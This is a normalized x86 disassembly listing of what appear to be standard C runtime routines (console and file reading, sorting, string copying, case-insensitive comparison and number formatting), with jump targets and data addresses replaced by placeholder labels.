jmp r-xdata
call sub_413b01
call sub_40e2e6
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_426b2a
mov eax edi
jmp r-xdata
sub_426b53
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
push ebx
mov ebx [ ebp + 0x8 ]
push edi
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_41528b
and [ eax ] 0x0
call sub_41529e
mov [ eax ] 0x9
jmp r-xdata
call sub_41528b
and [ eax ] 0x0
call sub_41529e
mov [ eax ] 0x9
cmp ebx [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov eax ebx
mov [ ebp - 0x14 ] 0x1
and eax 0x3f
mov edi ebx
sar edi 0x6
imul edx eax 0x30
mov [ ebp - 0x10 ] edi
mov eax [ edi * 4 + rw-data ]
mov [ ebp - 0x18 ] edx
mov cl [ edx + eax + 0x28 ]
mov [ ebp - 0x1 ] cl
test cl 0x1
je r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx 0x7fffffff
jbe r-xdata
test ecx ecx
je r-xdata
call sub_41528b
and [ eax ] 0x0
call sub_41529e
mov [ eax ] 0x16
jmp r-xdata
xor eax eax
jmp r-xdata
test [ ebp - 0x1 ] 0x2
jne r-xdata
call sub_413b01
pop edi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp + 0xc ] 0x0
je r-xdata
push esi
mov esi [ edx + eax + 0x18 ]
mov al [ edx + eax + 0x29 ]
mov [ ebp - 0x1 ] al
mov [ ebp - 0x1c ] esi
xor esi esi
movsx eax al
sub eax 0x1
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax ecx
not eax
test dl al
jne r-xdata
sub eax 0x1
jne r-xdata
push 0x4
pop eax
shr ecx 0x1
mov [ ebp - 0xc ] eax
cmp ecx eax
jb r-xdata
call sub_41528b
and [ eax ] esi
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax ecx
not eax
test al 0x1
je r-xdata
push eax
call sub_419b3e
push 0x0
mov esi eax
call sub_41a3a5
push 0x0
call sub_41a3a5
add esp 0xc
mov [ ebp - 0x8 ] esi
test esi esi
jne r-xdata
mov eax ecx
mov [ ebp - 0xc ] ecx
or edi 0xffffffff
mov ebx [ ebp - 0x10 ]
xor edi edi
mov [ ebp - 0x24 ] eax
mov ebx [ ebx * 4 + rw-data ]
mov [ ebp - 0x20 ] ebx
test [ edx + ebx + 0x28 ] 0x48
mov ebx [ ebp + 0x8 ]
je r-xdata
push [ ebp - 0x14 ]
push 0x0
push 0x0
push ebx
call sub_41da40
mov ecx [ edi * 4 + rw-data ]
add esp 0x10
mov edi [ ebp - 0x18 ]
mov [ edi + ecx + 0x20 ] eax
mov eax esi
mov [ edi + ecx + 0x24 ] edx
mov edx edi
mov ecx [ ebp - 0xc ]
call sub_41529e
mov [ eax ] 0xc
call sub_41528b
mov [ eax ] 0x8
jmp r-xdata
push ebx
call sub_426370
pop ecx
test eax eax
je r-xdata
mov ebx [ ebp - 0x20 ]
mov bl [ edx + ebx + 0x2a ]
mov [ ebp - 0x2 ] bl
cmp bl 0xa
mov ebx [ ebp + 0x8 ]
je r-xdata
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
mov eax [ eax * 4 + rw-data ]
test [ ecx + eax + 0x28 ] 0x80
je r-xdata
test ecx ecx
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop edi
cmp eax edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
cmp [ ebp - 0x20 ] ecx
ja r-xdata
lea eax [ ebp - 0x28 ]
push eax
push [ ebp - 0x1c ]
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
mov bl [ ebp - 0x2 ]
mov edi [ ebp - 0x14 ]
mov [ eax ] bl
inc eax
mov ebx [ ebp + 0x8 ]
dec ecx
cmp [ ebp - 0x1 ] 0x0
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] ecx
mov eax [ eax * 4 + rw-data ]
mov [ edx + eax + 0x2a ] 0xa
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_41529e
mov [ eax ] 0x9
call sub_41528b
mov [ eax ] edi
jmp r-xdata
add edi [ ebp - 0x20 ]
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
mov al [ edx + eax + 0x2b ]
mov [ ebp - 0x2 ] al
cmp al 0xa
je r-xdata
push eax
call sub_415268
pop ecx
xor edi edi
jmp r-xdata
push esi
call sub_41a3a5
pop ecx
mov eax edi
pop esi
jmp r-xdata
cmp [ ebp - 0x1 ] 0x2
je r-xdata
push 0x0
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x1c ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
push 0x0
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0xc ]
shr eax 0x1
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x1c ]
call [ ReadConsoleW@IAT ]
test eax eax
jne r-xdata
test ecx ecx
je r-xdata
shr edi 0x1
cmp [ ebp - 0x14 ] 0x0
push edi
push [ ebp - 0x24 ]
push ebx
je r-xdata
shr ecx 0x1
push ecx
push [ ebp + 0xc ]
push edi
push [ ebp - 0x8 ]
push ebx
call sub_42686f
add esp 0x14
mov eax [ ebp - 0x20 ]
mov ecx [ ebp + 0x10 ]
lea edi [ edi + eax * 2 ]
jmp r-xdata
call [ GetLastError@IAT ]
mov eax [ ebp - 0x8 ]
mov bl [ ebp - 0x2 ]
push 0x2
pop edi
mov [ eax ] bl
inc eax
mov ebx [ ebp + 0x8 ]
dec ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] ecx
mov eax [ eax * 4 + rw-data ]
mov [ edx + eax + 0x2b ] 0xa
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x14 ]
jne r-xdata
call sub_4266af
jmp r-xdata
call sub_4269bf
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x18 ]
mov eax [ eax * 4 + rw-data ]
test [ edx + eax + 0x28 ] 0x80
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
mov al [ edx + eax + 0x2c ]
mov [ ebp - 0x2 ] al
cmp al 0xa
je r-xdata
add esp 0xc
jmp r-xdata
mov edi eax
jmp r-xdata
test ecx ecx
je r-xdata
mov eax [ ebp - 0x8 ]
mov bl [ ebp - 0x2 ]
push 0x3
pop edi
mov [ eax ] bl
inc eax
mov ebx [ ebp + 0x8 ]
dec ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] ecx
mov eax [ eax * 4 + rw-data ]
mov [ edx + eax + 0x2c ] 0xa
sub_426f08
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
call sub_42903d
mov eax [ rw-data ]
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
jmp r-xdata
mov ax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
sub_426f50
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
cmp ebx ecx
jbe r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_40d56a
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x10 ]
push esi
push edi
lea edx [ ecx + eax ]
mov esi eax
mov edx ebx
cmp edi ebx
je r-xdata
jmp r-xdata
sub ebx eax
lea edx [ ecx + eax ]
cmp ebx ecx
ja r-xdata
test eax eax
je r-xdata
mov ecx [ ebp + 0x14 ]
push edi
push esi
call [ r--data ]
call [ ebp + 0x14 ]
add esp 0x8
test eax eax
jle r-xdata
mov esi edx
mov edi ecx
cmp esi ebx
ja r-xdata
pop edi
pop esi
sub edi ebx
mov eax [ ebp + 0x10 ]
add esi eax
cmp esi ebx
jbe r-xdata
mov edi esi
mov al [ edx ]
lea edx [ edx + 0x1 ]
mov cl [ edi + edx - 0x1 ]
mov [ edi + edx - 0x1 ] al
mov [ edx - 0x1 ] cl
sub esi 0x1
jne r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
sub_426ff0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
cmp edi eax
je r-xdata
pop edi
pop ebp
retn
push esi
mov esi [ ebp + 0x10 ]
test esi esi
je r-xdata
pop esi
sub edi eax
lea ebx [ ebx ]
mov cl [ eax ]
lea eax [ eax + 0x1 ]
mov dl [ edi + eax - 0x1 ]
mov [ edi + eax - 0x1 ] cl
mov [ eax - 0x1 ] dl
sub esi 0x1
jne r-xdata
sub_427030
mov edi edi
push ebp
mov ebp esp
sub esp 0x11c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ebp - 0x104 ] ecx
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x100 ] esi
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xfc ] edi
test ecx ecx
jne r-xdata
test edi edi
je r-xdata
test edx edx
je r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn
test esi esi
je r-xdata
mov [ ebp - 0x108 ] 0x0
cmp edx 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
retn
dec edx
imul edx edi
push ebx
add edx ecx
shr ebx 0x1
imul ebx edi
add ebx ecx
push ebx
push ecx
mov ecx esi
mov [ ebp - 0x110 ] ebx
call [ r--data ]
call esi
add esp 0x8
test eax eax
jle r-xdata
push esi
push edi
push [ ebp - 0xf8 ]
push ecx
call sub_426f50
add esp 0x10
jmp r-xdata
push [ ebp - 0xf8 ]
mov ecx esi
push [ ebp - 0x104 ]
call [ r--data ]
call esi
add esp 0x8
test eax eax
jle r-xdata
push edi
push ebx
push [ ebp - 0x104 ]
call sub_426ff0
add esp 0xc
mov eax [ ebp - 0x108 ]
sub eax 0x1
mov [ ebp - 0x108 ] eax
js r-xdata
push [ ebp - 0xf8 ]
mov ecx esi
push ebx
call [ r--data ]
call esi
add esp 0x8
test eax eax
jle r-xdata
push edi
push [ ebp - 0xf8 ]
push [ ebp - 0x104 ]
call sub_426ff0
add esp 0xc
pop ebx
mov ecx [ ebp + eax * 4 - 0xf4 ]
mov edx [ ebp + eax * 4 - 0x7c ]
mov [ ebp - 0x104 ] ecx
jmp r-xdata
mov eax [ ebp - 0xf8 ]
mov edi eax
mov esi [ ebp - 0x104 ]
mov edx [ ebp - 0xfc ]
mov [ ebp - 0x114 ] eax
nop
push edi
push [ ebp - 0xf8 ]
push ebx
call sub_426ff0
add esp 0xc
mov [ ebp - 0xf8 ] edx
mov edi [ ebp - 0x100 ]
add esi edx
mov [ ebp - 0x10c ] esi
cmp esi ebx
jae r-xdata
mov edi [ ebp - 0x114 ]
mov [ ebp - 0x10c ] esi
push ebx
push esi
mov ecx edi
call [ r--data ]
call edi
mov edx [ ebp - 0xfc ]
add esp 0x8
test eax eax
mov eax [ ebp - 0xf8 ]
jle r-xdata
mov eax [ ebp - 0xf8 ]
mov ecx [ ebp - 0x100 ]
push ebx
push esi
call [ r--data ]
call [ ebp - 0x100 ]
mov edx [ ebp - 0xfc ]
add esp 0x8
test eax eax
jle r-xdata
mov edx [ ebp - 0xfc ]
sub edi edx
cmp edi ebx
jbe r-xdata
add esi edx
cmp esi eax
ja r-xdata
cmp ebx esi
ja r-xdata
mov esi [ ebp - 0x10c ]
mov [ ebp - 0x114 ] edi
cmp edi esi
jb r-xdata
push ebx
push edi
mov ecx esi
call [ r--data ]
call esi
add esp 0x8
test eax eax
jg r-xdata
mov esi [ ebp - 0x100 ]
jmp r-xdata
add edi edx
cmp ebx edi
jae r-xdata
mov [ ebp - 0x118 ] edx
mov [ ebp - 0x11c ] edi
cmp esi edi
je r-xdata
mov edx [ ebp - 0xfc ]
mov esi [ ebp - 0x100 ]
lea esp [ esp ]
mov eax [ ebp - 0xf8 ]
cmp ebx edi
jne r-xdata
mov ebx esi
mov edx edi
mov esi [ ebp - 0x118 ]
sub ebx edi
mov esi [ ebp - 0x10c ]
push ebx
push edi
mov ecx esi
call [ r--data ]
call esi
mov edx [ ebp - 0xfc ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x100 ]
push ebx
push edi
call [ r--data ]
call [ ebp - 0x100 ]
mov edx [ ebp - 0xfc ]
add esp 0x8
test eax eax
je r-xdata
cmp ebx esi
jbe r-xdata
mov ebx esi
mov [ ebp - 0x110 ] ebx
jmp r-xdata
mov al [ edx ]
lea edx [ edx + 0x1 ]
mov cl [ ebx + edx - 0x1 ]
mov [ ebx + edx - 0x1 ] al
mov [ edx - 0x1 ] cl
sub esi 0x1
jne r-xdata
mov esi [ ebp - 0x10c ]
mov ebx [ ebp - 0x110 ]
mov edx [ ebp - 0xfc ]
cmp esi edx
jae r-xdata
cmp ebx edi
jae r-xdata
sub edi edx
cmp edi [ ebp - 0x104 ]
jbe r-xdata
sub edi edx
cmp edi ebx
jbe r-xdata
cmp ebx edi
jb r-xdata
mov ecx [ ebp - 0x104 ]
mov esi [ ebp - 0x100 ]
cmp ecx edi
jae r-xdata
mov eax [ ebp - 0x108 ]
mov [ ebp + eax * 4 - 0xf4 ] esi
mov [ ebp + eax * 4 - 0x7c ] edx
inc eax
mov [ ebp - 0x108 ] eax
mov edi [ ebp - 0xfc ]
cmp esi edx
jae r-xdata
mov eax [ ebp - 0x108 ]
mov [ ebp + eax * 4 - 0xf4 ] ebx
mov [ ebp + eax * 4 - 0x7c ] edi
inc eax
mov [ ebp - 0x108 ] eax
mov edx [ ebp - 0xf8 ]
mov eax edi
mov ebx [ ebp - 0x104 ]
mov ecx edx
sub ecx esi
sub eax ebx
cmp eax ecx
jl r-xdata
mov edi [ ebp - 0xfc ]
mov edx edi
mov edi [ ebp - 0xfc ]
jmp r-xdata
mov esi [ ebp - 0x100 ]
jmp r-xdata
mov ecx esi
mov esi [ ebp - 0x100 ]
mov [ ebp - 0x104 ] ecx
jmp r-xdata
mov eax edx
xor edx edx
sub eax ecx
div edi
lea ebx [ eax + 0x1 ]
cmp ebx 0x8
ja r-xdata
sub_4273ca
mov edi edi
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
push esi
test edx edx
jne r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
call sub_41529e
push 0x16
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
cmp [ ebp + 0xc ] ecx
jne r-xdata
test edx edx
jne r-xdata
xor eax eax
jmp r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
mov [ ecx ] dl
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
push ebx
sub esi ecx
mov ebx eax
push edi
mov edi ecx
cmp edx 0xffffffff
jne r-xdata
mov [ ecx ] 0x0
mov al [ esi + edi ]
mov [ edi ] al
inc edi
test al al
je r-xdata
mov al [ esi + edi ]
mov [ edi ] al
inc edi
test al al
je r-xdata
test edx edx
mov edx [ ebp + 0x14 ]
jne r-xdata
sub ebx 0x1
je r-xdata
pop edi
test ebx ebx
pop ebx
jne r-xdata
sub ebx 0x1
jne r-xdata
mov [ edi ] 0x0
sub edx 0x1
jne r-xdata
cmp edx 0xffffffff
jne r-xdata
jmp r-xdata
mov [ ecx ] 0x0
call sub_41529e
push 0x22
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x50
mov [ ecx + eax - 0x1 ] 0x0
pop eax
jmp r-xdata
pop esi
mov [ eax ] esi
call sub_413b01
mov eax esi
sub_427490
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_4274df
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
push esi
push edi
test eax eax
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4275af
add esp 0x10
mov edx [ ebp + 0x8 ]
test edx edx
jne r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
mov eax 0x7fffffff
jmp r-xdata
mov edi [ ebp + 0x10 ]
mov esi 0x7fffffff
cmp edi esi
jbe r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
push ebx
push 0x41
pop ebx
push 0x5a
pop esi
sub edx ecx
mov [ ebp - 0x4 ] esi
jmp r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
mov eax esi
jmp r-xdata
movzx eax [ edx + ecx ]
cmp ax bx
jb r-xdata
mov esi eax
cmp ax si
ja r-xdata
add ecx 0x2
sub edi 0x1
je r-xdata
cmp ax [ ebp - 0x4 ]
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
movzx ecx ax
movzx eax si
sub eax ecx
pop ebx
jmp r-xdata
test si si
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp ax bx
jb r-xdata
cmp si ax
je r-xdata
push 0x5a
pop esi
sub_4275af
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
mov eax 0x7fffffff
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov esi 0x7fffffff
cmp ebx esi
jbe r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
mov eax 0x7fffffff
jmp r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_414048
mov eax [ ebp - 0xc ]
mov eax [ eax + 0xa4 ]
test eax eax
jne r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
jmp r-xdata
pop edi
push ebx
push edi
push ebx
push [ ebp + 0x8 ]
push 0x1001
push eax
call sub_429073
add esp 0x18
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
sub eax edi
push 0x41
mov [ ebp + 0x8 ] eax
pop esi
mov eax esi
pop esi
lea esi [ eax - 0x2 ]
call sub_41529e
mov [ eax ] 0x16
jmp r-xdata
mov ecx eax
cmp ax dx
ja r-xdata
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx eax
cmp ax dx
ja r-xdata
add eax 0x20
movzx ecx ax
jmp r-xdata
movzx eax dx
movzx esi cx
sub esi eax
jmp r-xdata
test cx cx
je r-xdata
add eax 0x20
movzx edx ax
jmp r-xdata
movzx eax [ edi ]
cmp ax si
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp cx dx
je r-xdata
add edi 0x2
sub ebx 0x1
je r-xdata
movzx eax [ eax + edi ]
push 0x5a
pop edx
cmp ax si
jb r-xdata
sub_4276dc
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
or eax 0xffffffff
pop ebp
retn
sub_42770f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
mov esi eax
push edi
cmp [ ebp + 0x18 ] bl
je r-xdata
mov edi esi
push 0x2d
pop edx
inc ebx
mov [ eax ] dx
lea esi [ eax + 0x2 ]
neg ecx
mov [ esi ] ax
add esi 0x2
inc ebx
test ecx ecx
je r-xdata
lea eax [ edx + 0x30 ]
cmp ebx [ ebp + 0x10 ]
jb r-xdata
cmp ebx [ ebp + 0x10 ]
jb r-xdata
xor eax eax
mov [ esi ] ax
sub esi 0x2
mov eax [ ebp + 0xc ]
xor ecx ecx
mov [ eax ] cx
call sub_41529e
push 0x22
pop esi
mov [ eax ] esi
call sub_413b01
mov eax esi
jmp r-xdata
mov eax ecx
xor edx edx
div [ ebp + 0x14 ]
mov ecx eax
lea eax [ edx + 0x57 ]
cmp edx 0x9
ja r-xdata
mov ax [ edi ]
movzx ecx [ esi ]
mov [ esi ] ax
sub esi 0x2
mov [ edi ] cx
add edi 0x2
cmp edi esi
jb r-xdata
xor eax eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_42779d
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push esi
test ecx ecx
jne r-xdata
mov edx [ ebp + 0x10 ]
test edx edx
je r-xdata
call sub_41529e
push 0x16
xor eax eax
cmp [ ebp + 0x18 ] al
mov [ ecx ] ax
setne al
inc eax
cmp edx eax
ja r-xdata
pop esi
pop ebp
retn
mov esi [ ebp + 0x14 ]
lea eax [ esi - 0x2 ]
cmp eax 0x22
ja r-xdata
call sub_41529e
push 0x22
jmp r-xdata
push [ ebp + 0x18 ]
push esi
push edx
push ecx
push [ ebp + 0x8 ]
call sub_42770f
add esp 0x14
pop esi
mov [ eax ] esi
call sub_413b01
mov eax esi
jmp r-xdata
sub_4277fc
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x14 ] 0xa
jne r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x1
jl r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42779d
add esp 0x14
mov esp ebp
pop ebp
retn
sub_427831
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
push edi
test eax eax
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4278e9
add esp 0x10
mov edi [ ebp + 0x10 ]
test edi edi
je r-xdata
pop edi
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
test edx edx
jne r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
mov eax 0x7fffffff
jmp r-xdata
push ebx
push esi
push 0x41
pop ebx
push 0x5a
pop esi
sub edx ecx
mov [ ebp - 0x4 ] esi
jmp r-xdata
movzx eax [ edx + ecx ]
cmp ax bx
jb r-xdata
mov esi eax
cmp ax si
ja r-xdata
add ecx 0x2
sub edi 0x1
je r-xdata
cmp ax [ ebp - 0x4 ]
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
movzx ecx ax
movzx eax si
pop esi
sub eax ecx
pop ebx
jmp r-xdata
test si si
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp ax bx
jb r-xdata
cmp si ax
je r-xdata
push 0x5a
pop esi
sub_4278e9
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
xor esi esi
push edi
cmp [ ebp + 0x10 ] esi
je r-xdata
mov eax esi
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
mov eax 0x7fffffff
jmp r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x14 ]
call sub_414048
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xa8 ] esi
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ ebx ]
push eax
call sub_428c48
movzx esi ax
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ edi ]
push eax
call sub_428c48
add esp 0x10
movzx eax ax
sub [ ebp + 0x10 ] 0x1
lea ebx [ ebx + 0x2 ]
lea edi [ edi + 0x2 ]
je r-xdata
mov ecx [ ebp + 0x10 ]
sub ebx edi
push 0x41
pop edx
push 0x5a
pop esi
mov [ ebp - 0x4 ] esi
jmp r-xdata
movzx eax ax
movzx esi si
sub esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
test si si
je r-xdata
movzx eax [ ebx + edi ]
cmp ax dx
jb r-xdata
mov ecx [ ebp - 0x14 ]
and [ ecx + 0x350 ] 0xfffffffd
cmp si ax
je r-xdata
mov esi eax
cmp ax si
ja r-xdata
add edi 0x2
sub ecx 0x1
je r-xdata
cmp ax [ ebp - 0x4 ]
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
test si si
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ edi ]
cmp ax dx
jb r-xdata
cmp si ax
je r-xdata
push 0x5a
pop esi
jmp r-xdata
sub_4279ea
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
push esi
test eax eax
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_427a56
add esp 0x10
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
mov eax 0x7fffffff
jmp r-xdata
mov esi 0x7fffffff
cmp [ ebp + 0x10 ] esi
jbe r-xdata
pop esi
pop ebp
retn
pop esi
pop ebp
jmp sub_4290e0
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
mov eax esi
jmp r-xdata
sub_427a56
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
push ebx
push esi
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_414048
mov edi [ ebp + 0x8 ]
mov esi 0x7fffffff
test edi edi
je r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
jmp r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx esi
jbe r-xdata
pop edi
mov eax esi
pop esi
pop ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
mov eax [ ebp - 0xc ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
sub edi ebx
push ecx
push ebx
push edi
call sub_4290e0
add esp 0xc
mov esi eax
jmp r-xdata
sub esi eax
test esi esi
je r-xdata
cmp esi eax
je r-xdata
movzx eax [ edi + ebx ]
lea ecx [ ebp - 0xc ]
push ecx
push eax
call sub_416f20
lea ecx [ ebp - 0xc ]
mov esi eax
movzx eax [ ebx ]
push ecx
push eax
call sub_416f20
add esp 0x10
inc ebx
sub [ ebp + 0x10 ] 0x1
je r-xdata
sub_427b0d
push 0x10
push r--data
call sub_40e2a0
xor eax eax
mov esi [ ebp + 0x18 ]
test esi esi
setne al
test eax eax
jne r-xdata
or [ esi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
je r-xdata
call sub_41529e
push 0x16
pop esi
mov [ eax ] esi
call sub_413b01
mov eax esi
jmp r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
call sub_40e2e6
retn
xor eax eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push esi
lea eax [ ebp - 0x20 ]
push eax
call sub_4280e7
add esp 0x1c
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_427bad
test edi edi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
add eax 0x1
je r-xdata
mov eax edi
or [ esi ] 0xffffffff
sub_427bad
cmp [ ebp - 0x20 ] 0x0
je r-xdata
retn
test edi edi
je r-xdata
push [ esi ]
call sub_41f9d0
pop ecx
mov ecx [ esi ]
mov eax ecx
sar eax 0x6
and ecx 0x3f
imul ecx ecx 0x30
mov eax [ eax * 4 + rw-data ]
and [ eax + ecx + 0x28 ] 0xfe
sub_427bd9
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
and eax 0x3f
